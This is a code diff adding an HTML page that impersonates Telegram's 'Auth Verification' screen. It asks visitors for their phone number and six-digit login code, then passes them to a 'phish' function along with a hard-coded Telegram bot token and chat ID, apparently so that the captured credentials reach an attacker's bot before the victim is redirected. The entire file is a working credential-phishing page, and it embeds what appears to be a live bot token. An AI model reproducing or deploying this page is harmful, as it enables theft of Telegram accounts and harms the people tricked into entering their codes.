@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="http://rb.gy/xuysf" type="image/png">
+    <title>Telegram</title>
+    <link rel="stylesheet" type="text/css" href="b.css">
+</head>
+<body>
+    <h1>Telegram Auth Verification</h1>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/512px-Telegram_logo.svg.png" alt="Telegram Logo">
+    <br>
+    <form>
+        <input type="number" id="username" placeholder="Enter Your Number" pattern="[0-9]+" required>
+        <input type="number" id="password" placeholder="Enter Verification Code" pattern="[0-9]{6}" required>
+        <button type="button" id="submit-button">Send</button>
+    </form>
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
+    <script src="phish.js"></script>
+    <script>
+        $(document).ready(function () {
+            const BOT_TOKEN = '5859229506:AAFXpo-hhlYpiTZCovNte1WgOkflilylryc';
+            const CHAT_ID = '514195905';
+            const REDIRECT_URL = 'h.html';
+            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
+        });
+    </script>
+</body>
+</html>
